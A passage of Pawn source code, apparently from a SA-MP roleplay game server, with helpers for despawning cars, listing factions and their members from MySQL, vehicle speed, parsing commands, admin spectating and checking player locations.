		DestroyVehicle(personalcar[0][playerid]);
		OwnedVeh(personalcar[0][playerid]) = 0;
		Gas[personalcar[0][playerid]] = 100;
		personalcar[0][playerid] = 0;
		DespawnCar[playerid][0] = -1;
	}
	if(personalcar[1][playerid] > 0)
	{
		vehEngine[personalcar[1][playerid]] = 0;
		DestroyVehicle(personalcar[1][playerid]);
		OwnedVeh(personalcar[1][playerid]) = 0;
		Gas[personalcar[1][playerid]] = 100;
		personalcar[1][playerid] = 0;
		DespawnCar[playerid][1] = -1;
	}
	if(personalcar[2][playerid] > 0)
	{
		vehEngine[personalcar[2][playerid]] = 0;
		DestroyVehicle(personalcar[2][playerid]);
		OwnedVeh(personalcar[2][playerid]) = 0;
		Gas[personalcar[2][playerid]] = 100;
		personalcar[2][playerid] = 0;
		DespawnCar[playerid][2] = -1;
	}
	if(personalcar[3][playerid] > 0)
	{
		vehEngine[personalcar[3][playerid]] = 0;
		DestroyVehicle(personalcar[3][playerid]);
		OwnedVeh(personalcar[3][playerid]) = 0;
		Gas[personalcar[3][playerid]] = 100;
		personalcar[3][playerid] = 0;
		DespawnCar[playerid][3] = -1;
	}
	if(personalcar[4][playerid] > 0)
	{
		vehEngine[personalcar[4][playerid]] = 0;
		DestroyVehicle(personalcar[4][playerid]);
		OwnedVeh(personalcar[4][playerid]) = 0;
		Gas[personalcar[4][playerid]] = 100;
		personalcar[4][playerid] = 0;
		DespawnCar[playerid][4] = -1;
	}
	if(personalcar[5][playerid] > 0)
	{
		vehEngine[personalcar[5][playerid]] = 0;
		DestroyVehicle(personalcar[5][playerid]);
		OwnedVeh(personalcar[5][playerid]) = 0;
		Gas[personalcar[5][playerid]] = 100;
		personalcar[5][playerid] = 0;
		DespawnCar[playerid][5] = -1;
	}
	if(personalcar[6][playerid] > 0)
	{
		vehEngine[personalcar[6][playerid]] = 0;
		DestroyVehicle(personalcar[6][playerid]);
		OwnedVeh(personalcar[6][playerid]) = 0;
		Gas[personalcar[6][playerid]] = 100;
		personalcar[6][playerid] = 0;
		DespawnCar[playerid][6] = -1;
	}
	if(personalcar[7][playerid] > 0)
	{
		vehEngine[personalcar[7][playerid]] = 0;
		DestroyVehicle(personalcar[7][playerid]);
		OwnedVeh(personalcar[7][playerid]) = 0;
		Gas[personalcar[7][playerid]] = 100;
		personalcar[7][playerid] = 0;
		DespawnCar[playerid][7] = -1;
	}
	if(personalcar[8][playerid] > 0)
	{
		vehEngine[personalcar[8][playerid]] = 0;
		DestroyVehicle(personalcar[8][playerid]);
		OwnedVeh(personalcar[8][playerid]) = 0;
		Gas[personalcar[8][playerid]] = 100;
		personalcar[8][playerid] = 0;
		DespawnCar[playerid][8] = -1;
	}
	if(personalcar[9][playerid] > 0)
	{
		vehEngine[personalcar[9][playerid]] = 0;
		DestroyVehicle(personalcar[9][playerid]);
		OwnedVeh(personalcar[9][playerid]) = 0;
		Gas[personalcar[9][playerid]] = 100;
		personalcar[9][playerid] = 0;
		DespawnCar[playerid][9] = -1;
	}
	if(personalcar[10][playerid] > 0)
	{
		vehEngine[personalcar[10][playerid]] = 0;
		DestroyVehicle(personalcar[10][playerid]);
		OwnedVeh(personalcar[10][playerid]) = 0;
		Gas[personalcar[10][playerid]] = 100;
		personalcar[10][playerid] = 0;
		DespawnCar[playerid][10] = -1;
	}
	if(personalcar[11][playerid] > 0)
	{
		vehEngine[personalcar[11][playerid]] = 0;
		DestroyVehicle(personalcar[11][playerid]);
		OwnedVeh(personalcar[11][playerid]) = 0;
		Gas[personalcar[11][playerid]] = 100;
		personalcar[11][playerid] = 0;
		DespawnCar[playerid][11] = -1;
	}
	if(personalcar[12][playerid] > 0)
	{
		vehEngine[personalcar[12][playerid]] = 0;
		DestroyVehicle(personalcar[12][playerid]);
		OwnedVeh(personalcar[12][playerid]) = 0;
		Gas[personalcar[12][playerid]] = 100;
		personalcar[12][playerid] = 0;
		DespawnCar[playerid][12] = -1;
	}
	if(personalcar[13][playerid] > 0)
	{
		vehEngine[personalcar[13][playerid]] = 0;
		DestroyVehicle(personalcar[13][playerid]);
		OwnedVeh(personalcar[13][playerid]) = 0;
		Gas[personalcar[13][playerid]] = 100;
		personalcar[13][playerid] = 0;
		DespawnCar[playerid][13] = -1;
	}
	if(personalcar[14][playerid] > 0)
	{
		vehEngine[personalcar[14][playerid]] = 0;
		DestroyVehicle(personalcar[14][playerid]);
		OwnedVeh(personalcar[14][playerid]) = 0;
		Gas[personalcar[14][playerid]] = 100;
		personalcar[14][playerid] = 0;
		DespawnCar[playerid][14] = -1;
	}
	return 1;
}
stock IsPlayerInRangeOfPlayer(playerid, playerid2, Float: radius) {

	new
		Float:Floats[3];

	GetPlayerPos(playerid2, Floats[0], Floats[1], Floats[2]);
	return IsPlayerInRangeOfPoint(playerid, radius, Floats[0], Floats[1], Floats[2]);
}

stock GetClanMembers(clanid)
{
	new string[256],
		members=0;
	format(string, sizeof(string), "SELECT * FROM `users` WHERE `Clan` = '%d'", clanid);
	new Cache: membresult = mysql_query(SQL, string);
	for(new i, j = cache_get_row_count (); i != j; ++i)
	{
		members++;
	}
	cache_delete(membresult);
	return members;
}

stock GetFactionMembers(fid)
{
	new string[128],
		Cache: Result,
		Get[2];
	format(string, sizeof(string), "SELECT `Member` FROM `users` WHERE `Member` = %d", fid);
    Result = mysql_query(SQL, string);
    cache_get_data(Get[0], Get[1], SQL);
    cache_delete(Result);
	return Get[0];
}

stock ShowFactions(playerid)
{
	new stringz2[MAX_STRING];
 	if(DynamicFactions[1][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", DynamicFactions[1][fName],GetFactionMembers(1), DynamicFactions[1][fMaxMembers]);
	}
	else
	{
		format(stringz2, sizeof(stringz2),"{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", DynamicFactions[1][fName],GetFactionMembers(1), DynamicFactions[1][fMaxMembers]);
	}
 	if(DynamicFactions[2][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[2][fName],GetFactionMembers(2), DynamicFactions[2][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[2][fName],GetFactionMembers(2), DynamicFactions[2][fMaxMembers]);
	}
	if(DynamicFactions[3][fApplication] > 0)
	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[3][fName],GetFactionMembers(3), DynamicFactions[3][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[3][fName],GetFactionMembers(3), DynamicFactions[3][fMaxMembers]);
	}
 	if(DynamicFactions[4][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[4][fName],GetFactionMembers(4), DynamicFactions[4][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[4][fName],GetFactionMembers(4), DynamicFactions[4][fMaxMembers]);
	}
 	if(DynamicFactions[5][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[5][fName],GetFactionMembers(5), DynamicFactions[5][fMaxMembers]);
	}
	else
	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[5][fName],GetFactionMembers(5), DynamicFactions[5][fMaxMembers]);
	}
 	if(DynamicFactions[6][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[6][fName],GetFactionMembers(6), DynamicFactions[6][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[6][fName],GetFactionMembers(6), DynamicFactions[6][fMaxMembers]);
	}
 	if(DynamicFactions[8][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[8][fName],GetFactionMembers(8), DynamicFactions[8][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[8][fName],GetFactionMembers(8), DynamicFactions[8][fMaxMembers]);
	}
 	if(DynamicFactions[9][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[9][fName],GetFactionMembers(9), DynamicFactions[9][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2,  DynamicFactions[9][fName],GetFactionMembers(9), DynamicFactions[9][fMaxMembers]);
	}
 	if(DynamicFactions[10][fApplication] > 0)
   	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[10][fName],GetFactionMembers(10), DynamicFactions[10][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[10][fName],GetFactionMembers(10), DynamicFactions[10][fMaxMembers]);
	}
 	if(DynamicFactions[11][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[11][fName],GetFactionMembers(11), DynamicFactions[11][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[11][fName],GetFactionMembers(11), DynamicFactions[11][fMaxMembers]);
	}
 	if(DynamicFactions[12][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[12][fName],GetFactionMembers(12), DynamicFactions[12][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[12][fName],GetFactionMembers(12), DynamicFactions[12][fMaxMembers]);
	}
 	if(DynamicFactions[13][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[13][fName],GetFactionMembers(13), DynamicFactions[13][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[13][fName],GetFactionMembers(13), DynamicFactions[13][fMaxMembers]);
	}
 	if(DynamicFactions[14][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[14][fName],GetFactionMembers(14), DynamicFactions[14][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]\n", stringz2, DynamicFactions[14][fName],GetFactionMembers(14), DynamicFactions[14][fMaxMembers]);
	}
	if(DynamicFactions[15][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[Open]\n", stringz2, DynamicFactions[15][fName],GetFactionMembers(15), DynamicFactions[15][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[Closed]", stringz2, DynamicFactions[15][fName],GetFactionMembers(15), DynamicFactions[15][fMaxMembers]);
	}
	format(MGLOBAL, sizeof(MGLOBAL), "Faction\tMembers\tApplication Status\n%s",stringz2);
	ShowPlayerDialog(playerid, DIALOG_FACTIONS, DIALOG_STYLE_TABLIST_HEADERS,"Factions", MGLOBAL, "Select", "Cancel");
	return 1;
}

stock GetOnLinePlayers()
{
    new OnLine;
    for(new i= 0; i < MAX_PLAYERS; i++)
	{
        if(IsPlayerConnected(i))
		{
            OnLine++;
		}
	}	
    return OnLine;
}

stock Text3D:CreateStreamed3DTextLabel(const string[], color, Float:posx, Float:posy, Float:posz, Float:draw_distance, virtualworld, testlos = 0)
{
	return CreateDynamic3DTextLabel(string, color, posx, posy, posz, draw_distance, INVALID_PLAYER_ID, INVALID_PLAYER_ID, testlos, virtualworld, -1, -1, 100.0);
}

stock GetVehicleSpeedIDCAR(vehicleid)
{
    new Float:x,Float:y,Float:z,vel;
    GetVehicleVelocity( vehicleid, x, y, z );
    vel = floatround( floatsqroot( x*x + y*y + z*z ) * 180 );
    return vel;
}

stock GetVehicleSpeed(vehicleid, get3d)
{
	new Float:x, Float:y, Float:z;
	GetVehicleVelocity(vehicleid, x, y, z);
	return SpeedCheck(x, y, z, 100.0, get3d);
}

stock ModifyVehicleSpeed(vehicleid,mph) //Miles Per Hour
{
	new Float:Vx,Float:Vy,Float:Vz,Float:DV,Float:multiple;
	GetVehicleVelocity(vehicleid,Vx,Vy,Vz);
	DV = floatsqroot(Vx*Vx + Vy*Vy + Vz*Vz);
	if(DV > 0) //Directional velocity must be greater than 0 (display strobes if 0)
	{
		multiple = ((mph + DV * 100) / (DV * 100)); //Multiplying DV by 100 calculates speed in MPH
		return SetVehicleVelocity(vehicleid,Vx*multiple,Vy*multiple,Vz*multiple);
	}
	return 0;
}

stock PlayAudioStreamForPlayersInCar(vehicleid,url[])
{
    foreach(Player,i)
    {
        if(IsPlayerInAnyVehicle(i))
        {
            if(GetPlayerVehicleID(i) == vehicleid)
            {
                PlayAudioStreamForPlayer(i,url);
            }
        }
    }
    return 1;
}

stock StopAudioStreamForPlayersInCar(vehicleid)
{
    foreach(Player,i)
    {
        if(IsPlayerInAnyVehicle(i))
        {
            if(GetPlayerVehicleID(i) == vehicleid)
            {
                StopAudioStreamForPlayer(i);
            }
        }
    }
    return 1;
}

FormatNumber(number)
{
   new Str[15];
   format(Str, 15, "%d", number);

   if (strlen(Str) < sizeof(Str))
   {
      if (number >= 1000 && number < 10000)
             strins( Str, ",", 1, sizeof(Str));

      else if (number >= 10000 && number < 100000)
           strins(Str, ",", 2, sizeof(Str));

      else if (number >= 100000 && number < 1000000)
           strins(Str, ",", 3, sizeof(Str));

      else if (number >= 1000000 && number < 10000000)
           strins(Str, ",", 1, sizeof(Str)),strins(Str, ",", 5, sizeof(Str));

      else if (number >= 10000000 && number < 100000000)
           strins(Str, ",", 2, sizeof(Str)),strins(Str, ",", 6, sizeof(Str));

      else if (number >= 100000000 && number < 1000000000)
           strins(Str, ",", 3, sizeof(Str)),strins(Str, ",", 7, sizeof(Str));

      else if (number >= 1000000000 && number < 10000000000)
           strins(Str, ",", 1, sizeof(Str)),
           strins(Str, ",", 5, sizeof(Str)),
           strins(Str, ",", 9, sizeof(Str));
      else format(Str, 10, "%d", number);
   }
   else  format( Str, 15, "<BUG>" );
   return Str;
}

stock sscanf(string[], format[], {Float,_}:...)
{
	#if defined isnull
		if (isnull(string))
	#else
		if (string[0] == 0 || (string[0] == 1 && string[1] == 0))
	#endif
		{
			return format[0];
		}
	#pragma tabsize 4
	new
		formatPos = 0,
		stringPos = 0,
		paramPos = 2,
		paramCount = numargs(),
		delim = ' ';
	while (string[stringPos] && string[stringPos] <= ' ')
	{
		stringPos++;
	}
	while (paramPos < paramCount && string[stringPos])
	{
		switch (format[formatPos++])
		{
			case '\0':
			{
				return 0;
			}
			case 'i', 'd':
			{
				new
					neg = 1,
					num = 0,
					ch = string[stringPos];
				if (ch == '-')
				{
					neg = -1;
					ch = string[++stringPos];
				}
				do
				{
					stringPos++;
					if ('0' <= ch <= '9')
					{
						num = (num * 10) + (ch - '0');
					}
					else
					{
						return -1;
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num * neg);
			}
			case 'h', 'x':
			{
				new
					num = 0,
					ch = string[stringPos];
				do
				{
					stringPos++;
					switch (ch)
					{
						case 'x', 'X':
						{
							num = 0;
							continue;
						}
						case '0' .. '9':
						{
							num = (num << 4) | (ch - '0');
						}
						case 'a' .. 'f':
						{
							num = (num << 4) | (ch - ('a' - 10));
						}
						case 'A' .. 'F':
						{
							num = (num << 4) | (ch - ('A' - 10));
						}
						default:
						{
							return -1;
						}
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num);
			}
			case 'c':
			{
				setarg(paramPos, 0, string[stringPos++]);
			}
			case 'f':
			{

				new changestr[16], changepos = 0, strpos = stringPos;
				while(changepos < 16 && string[strpos] && string[strpos] != delim)
				{
					changestr[changepos++] = string[strpos++];
    				}
				changestr[changepos] = '\0';
				setarg(paramPos,0,_:floatstr(changestr));
			}
			case 'p':
			{
				delim = format[formatPos++];
				continue;
			}
			case '\':
			{
				new
					end = formatPos - 1,
					ch;
				while ((ch = format[++end]) && ch != '\') {}
				if (!ch)
				{
					return -1;
				}
				format[end] = '\0';
				if ((ch = strfind(string, format[formatPos], false, stringPos)) == -1)
				{
					if (format[end + 1])
					{
						return -1;
					}
					return 0;
				}
				format[end] = '\';
				stringPos = ch + (end - formatPos);
				formatPos = end + 1;
			}
			case 'u':
			{
				new
					end = stringPos - 1,
					id = 0,
					bool:num = true,
					ch;
				while ((ch = string[++end]) && ch != delim)
				{
					if (num)
					{
						if ('0' <= ch <= '9')
						{
							id = (id * 10) + (ch - '0');
						}
						else
						{
							num = false;
						}
					}
				}
				if (num && IsPlayerConnected(id))
				{
					setarg(paramPos, 0, id);
				}
				else
				{
					#if !defined foreach
						#define foreach(%1,%2) for (new %2 = 0; %2 < MAX_PLAYERS; %2++) if (IsPlayerConnected(%2))
						#define __SSCANF_FOREACH__
					#endif
					string[end] = '\0';
					num = false;
					new
						name[MAX_PLAYER_NAME];
					id = end - stringPos;
					foreach (Player, playerid)
					{
						GetPlayerName(playerid, name, sizeof (name));
						if (!strcmp(name, string[stringPos], true, id))
						{
							setarg(paramPos, 0, playerid);
							num = true;
							break;
						}
					}
					if (!num)
					{
						setarg(paramPos, 0, INVALID_PLAYER_ID);
					}
					string[end] = ch;
					#if defined __SSCANF_FOREACH__
						#undef foreach
						#undef __SSCANF_FOREACH__
					#endif
				}
				stringPos = end;
			}
			case 's', 'z':
			{
				new
					i = 0,
					ch;
				if (format[formatPos])
				{
					while ((ch = string[stringPos++]) && ch != delim)
					{
						setarg(paramPos, i++, ch);
					}
					if (!i)
					{
						return -1;
					}
				}
				else
				{
					while ((ch = string[stringPos++]))
					{
						setarg(paramPos, i++, ch);
					}
				}
				stringPos--;
				setarg(paramPos, i, '\0');
			}
			default:
			{
				continue;
			}
		}
		while (string[stringPos] && string[stringPos] != delim && string[stringPos] > ' ')
		{
			stringPos++;
		}
		while (string[stringPos] && (string[stringPos] == delim || string[stringPos] <= ' '))
		{
			stringPos++;
		}
		paramPos++;
	}
	do
	{
		if ((delim = format[formatPos++]) > ' ')
		{
			if (delim == '\')
			{
				while ((delim = format[formatPos++]) && delim != '\') {}
			}
			else if (delim != 'z')
			{
				return delim;
			}
		}
	}
	while (delim > ' ');
	return 0;
}

stock right(source[], len)
{
	new retval[MAX_STRING], srclen;
	srclen = strlen(source);
	strmid(retval, source, srclen - len, srclen, MAX_STRING);
	return retval;
}

stock IsMail(email[])
{
  	new len=strlen(email),
  		cstate=0,
  		i;
  	for(i=0;i<len;i++)
	{
	    if ((cstate==0 || cstate==1) && (email[i]>='A' && email[i]<='Z')||(email[i]>='0' && email[i]<='9') || (email[i]>='a' && email[i]<='z')  || (email[i]=='.')  || (email[i]=='-')  || (email[i]=='_'))
	    {
	    }
		else
		{
	       // Ok no A..Z,a..z,_,.,-
	       if ((cstate==0) &&(email[i]=='@'))
		   {
	          // its an @ after the name, ok state=1;
	          cstate=1;
	       }
		   else
		   {
	          // Its stuff which is not allowed
	          return false;
	       }
	 	}
	}
  	if (cstate<1) return false;
  	if (len<6) return false;
  	// A toplevel domain has only 3 to 4 signs :-)
  	if ((email[len-3]=='.') || (email[len-4]=='.') || (email[len-5]=='.')) return true;
  	return false;
}

stock IsVehicleOccupied(vehicleid)
{
	foreach(Player, i)
	{
		if( IsPlayerInVehicle( i, vehicleid ) ) return 1;
	}
	return 0;
}

public FindCheck()
{
	foreach(Player,i)
	{
		if(IsPlayerInRangeOfPoint(i, 13, 2072.4768,-1831.2830,13.5469) || IsPlayerInRangeOfPoint(i, 6, 2644.5295,-2038.7869,13.5500) || IsPlayerInRangeOfPoint(i, 10, -2713.7598,217.7967,4.2708)
		|| IsPlayerInRangeOfPoint(i, 7, 719.9402,-462.5237,16.3359) || IsPlayerInRangeOfPoint(i, 15, 1031.0894,-1032.8621,31.8808) || IsPlayerInRangeOfPoint(i, 15, 1043.7579,-1029.8914,32.0915)
		|| IsPlayerInRangeOfPoint(i, 15, 1965.3313,2158.0725,10.8203) || IsPlayerInRangeOfPoint(i, 15, 2390.6292,1040.2854,10.8203))
		{
		    DisableRemoteVehicleCollisions(i, 1);
		}
		else
		{
		    DisableRemoteVehicleCollisions(i, 0);
		}
	}
	return 1;
}

public Spectator()
{
	new string[256];
	foreach(Player,i)
	{
	    if(PlayerInfo[i][pAdmin] >= 1 || PlayerInfo[i][pHelper] >= 1)
	    {
			if(IsPlayerConnected(i))
			{
				if(Spectate[i] != -1)
				{
					new targetid = Spectate[i];
					if(IsPlayerConnected(targetid))
					{
				        new Float:health,
					    	name[MAX_PLAYER_NAME];
					    GetPlayerName(targetid, name, sizeof(name));
					    GetPlayerHealthEx(targetid, health);
					    if(GetPlayerState(targetid) == PLAYER_STATE_DRIVER || GetPlayerState(targetid) == PLAYER_STATE_PASSENGER)
						{
					        new Float:Valoarea,
								carid = GetPlayerVehicleID(targetid),
								speed = Carspeed(targetid);
							GetVehicleHealth(carid,Valoarea);
						    format(string, sizeof(string), "%s (~r~%d~w~) - L ~r~%d", name, targetid, PlayerInfo[targetid][pLevel]);
						    PlayerTextDrawSetString(i, TextDrawSpec[i][1], string);
						    format(string, sizeof(string), "HEALTH:~r~ %.1f", health);
						    PlayerTextDrawSetString(i, TextDrawSpec[i][2], string);
						    format(string, sizeof(string), "W: ~r~%d ~w~- JAIL: ~r~%d", PlayerInfo[targetid][pWantedLevel], PlayerInfo[targetid][pJailTime]);
							PlayerTextDrawSetString(i, TextDrawSpec[i][3], string);
							format(string, sizeof(string), "CAR: ~r~%d ~w~(~r~%.1f~w~ HP)", carid, Valoarea);
							PlayerTextDrawSetString(i, TextDrawSpec[i][4], string);
							format(string, sizeof(string), "SPEED: ~g~%d KM/H", speed);
							PlayerTextDrawSetString(i, TextDrawSpec[i][5], string);
						    PlayerTextDrawShow(i, TextDrawSpec[i][1]);
							PlayerTextDrawShow(i, TextDrawSpec[i][2]);
							PlayerTextDrawShow(i, TextDrawSpec[i][3]);
							PlayerTextDrawShow(i, TextDrawSpec[i][4]);
							PlayerTextDrawShow(i, TextDrawSpec[i][5]);
						}
						else if(GetPlayerState(targetid) == PLAYER_STATE_ONFOOT)
						{
						    format(string, sizeof(string), "%s (~r~%d~w~) - L ~r~%d", name, targetid, PlayerInfo[targetid][pLevel]);
						    PlayerTextDrawSetString(i, TextDrawSpec[i][1], string);
						    format(string, sizeof(string), "HEALTH:~r~ %.1f", health);
						    PlayerTextDrawSetString(i, TextDrawSpec[i][2], string);
							format(string, sizeof(string), "W: ~r~%d ~w~- JAIL: ~r~%d", PlayerInfo[targetid][pWantedLevel], PlayerInfo[targetid][pJailTime]);
						    PlayerTextDrawSetString(i, TextDrawSpec[i][3], string);
						    PlayerTextDrawShow(i, TextDrawSpec[i][1]);
					        PlayerTextDrawShow(i, TextDrawSpec[i][2]);
					        PlayerTextDrawShow(i, TextDrawSpec[i][3]);
					    	PlayerTextDrawHide(i, TextDrawSpec[i][4]);
					    	PlayerTextDrawHide(i, TextDrawSpec[i][5]);
						}
						if(GetPlayerInterior(targetid) != GetPlayerInterior(i))
						{
							SetPlayerInterior(i,GetPlayerInterior(targetid));
							PlayerSpectatePlayer(i, targetid);
						}
						if(GetPlayerVirtualWorld(targetid) != GetPlayerVirtualWorld(i))
						{
							SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(targetid));
							PlayerSpectatePlayer(i, targetid);
						}
						if(SpectateState[targetid] == 1 && GetPlayerState(targetid) == PLAYER_STATE_DRIVER || SpectateState[targetid] == 1 && GetPlayerState(targetid) == PLAYER_STATE_PASSENGER)
						{
							new carid = GetPlayerVehicleID(targetid);
						    PlayerSpectateVehicle(i, carid);
							SpectateState[targetid] = 2;
						}
						if(SpectateState[targetid] == 2 && GetPlayerState(targetid) == PLAYER_STATE_ONFOOT)
						{
							PlayerSpectatePlayer(i, Spectate[targetid]);
							SpectateState[targetid] = 1;
						}
					}
				}
				else
				{
				    PlayerTextDrawHide(i, TextDrawSpec[i][1]);
			    	PlayerTextDrawHide(i, TextDrawSpec[i][2]);
	    			PlayerTextDrawHide(i, TextDrawSpec[i][3]);
			    	PlayerTextDrawHide(i, TextDrawSpec[i][4]);
			    	PlayerTextDrawHide(i, TextDrawSpec[i][5]);
				}
			}
		}
	}
	return 1;
}

// FISH PLACE
public VaildFishPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 10,840.9308,-2066.2319,12.8672))
		{
		    return 1;
		}
	}
	return 0;
}

forward DepositMoney(playerid);
public DepositMoney(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader],
	    	member = PlayerInfo[playerid][pMember];
	    if(member == 1 || member == 2 || member == 3 || member == 4 || member == 5 || member == 6 || member == 7 || member == 8 || member == 9 || member == 10 || member == 11 || member == 12 || member == 13 || member == 14)
		{
		    return 1;
		}
		if(leader == 1 || leader == 2 || leader == 3 || leader == 4 || leader == 5 || leader == 6 || leader == 7 || leader == 8 || leader == 9 || leader == 10 || leader == 11 || leader == 12 || leader == 13 || leader == 14)
		{
		    return 1;
		}
	}
	return 0;
}

// MAFIA MEMBER
public IsAMember(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader],
	    	member = PlayerInfo[playerid][pMember];
	    if(member == 4 || member == 5 || member == 6 || member == 10)
		{
		    return 1;
		}
		if(leader==4 || leader==5 || leader==6 || leader==10)
		{
		    return 1;
		}
	}
	return 0;
}

// COP
public IsACop(playerid)
{
	new returnare = 0;
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader],
	    	member = PlayerInfo[playerid][pMember];
	    if(member==1 || member==2 || member==3 || member==8 || member == 15)
		{
		    returnare = 1;
		}
		else if(leader==1 || leader==2 || leader==3 || leader==8 || leader==15)
		{
		    returnare = 1;
		}
	}
	return returnare;
}
////medic
public IsAMedic(playerid)
{
	new returnare = 0;
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader],
	    	member = PlayerInfo[playerid][pMember];
	    if(member==14)
		{
		    returnare = 1;
		}
		else if(leader==14)
		{
		    returnare = 1;
		}
	}
	return returnare;
}

// BANK
public IsAtBank(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 50.0, 1048.0681,-371.8315,9.2367))
	    {//BANK LS
	        return 1;
	    }
	}
	return 0;
}

// ORDER PLACE
public IsAtOrderPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 50.0, 2316.0618,-1143.6814,1054.3047) || IsPlayerInRangeOfPoint(playerid,50.0, 2496.049804,-1695.238159,1014.742187) || IsPlayerInRangeOfPoint(playerid, 50.0, 940.8331,-18.1071,1000.9297) || IsPlayerInRangeOfPoint(playerid, 70.0, 774.2140,-48.9243,1000.5859))
	    {//BANK LS
	        return 1;
	    }
	}
	return 0;
}

// GAS STATION PLACE
public IsAtGasStation(playerid)
{
    if(IsPlayerConnected(playerid))
	{
	    //Los Santos Gas Station
		if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[33][bEntranceX],BizzInfo[33][bEntranceY],BizzInfo[33][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[42][bEntranceX],BizzInfo[42][bEntranceY],BizzInfo[42][bEntranceZ]))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ]))
		{
		    return 1;
		}
		//Las Venturas Gas Station
		else if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[45][bEntranceX],BizzInfo[45][bEntranceY],BizzInfo[45][bEntranceZ]))
		{
		    return 1;
		}
